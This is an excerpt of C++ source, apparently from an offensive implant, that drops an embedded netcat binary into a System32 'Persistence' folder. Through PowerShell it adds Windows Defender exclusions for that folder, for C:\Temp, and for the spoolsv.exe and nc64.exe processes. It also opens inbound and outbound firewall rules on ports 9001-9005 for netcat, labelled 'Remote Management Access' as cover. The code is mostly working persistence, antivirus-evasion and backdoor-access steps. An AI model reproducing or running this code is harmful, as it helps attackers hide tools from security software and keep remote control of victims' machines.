...
int wmain() {
	...
	// write the nc to disk
	Log("[+] Dropping nc to disk.", componentName);
	std::ofstream outfileN("C:\\Windows\\System32\\Persistence\\nc64.exe", std::ios::out | std::ios::binary);
	outfileN.write(&nc64[0], sizeof(nc64)); // try catch?
	outfileN.close();
...
void DisableDefender() {
	...
	Log("[*] Adding Defender exclusion thru registry.", componentName);
	...
	std::string cmdline = "powershell.exe -Command "
		"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" -Name \"C:\\Temp\" -Value 0 -Type DWORD -Force -ErrorAction Continue;"
		"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" -Name \"C:\\Windows\\System32\\Persistence\" -Value 0 -Type DWORD -Force -ErrorAction Continue;"
		"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes\" -Name \"spoolsv.exe\" -Value 0 -Type DWORD -Force -ErrorAction Continue;"
		"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes\" -Name \"nc64.exe\" -Value 0 -Type DWORD -Force -ErrorAction Continue;";

	Log("[*] Output from Defender exclusion powershell process: " + CreateProcRedirIO("DefenderExclusion", cmdline), componentName);
...
void DisableFirewall() {
	...
	std::string cmdline = "powershell.exe -Command "
		"New-NetFirewallRule -DisplayName \"Remote Management Access\" -Direction Outbound -LocalPort 9001-9005 -Program \"C:\\Windows\\System32\\Persistence\\nc64.exe\" -Action Allow;"
		"New-NetFirewallRule -DisplayName \"Remote Management Access\" -Direction Inbound -LocalPort 9001-9005 -Program \"C:\\Windows\\System32\\Persistence\\nc64.exe\" -Action Allow;";

	Log("[*] Output from DisableFirewall powershell process: " + CreateProcRedirIO("FirewallRule", cmdline), componentName);
